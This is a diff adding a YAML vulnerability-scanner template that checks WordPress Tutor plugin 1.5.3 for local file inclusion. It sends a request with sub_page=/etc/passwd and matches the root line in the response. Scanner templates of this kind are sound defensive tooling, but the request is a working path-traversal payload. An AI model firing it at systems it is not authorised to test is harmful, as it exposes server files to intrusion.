@@ -1,0 +1,20 @@
+id: wp-tutor-lfi
+name: WordPress tutor 1.5.3 - Local File Inclusion
+severity: high
+confidence: tentative
+description: WordPress tutor.1.5.3 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- wordpress
+- wp-plugin
+- lfi
+- edb
+- vuln
+requests:
+- method: GET
+  path: /wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  condition: or
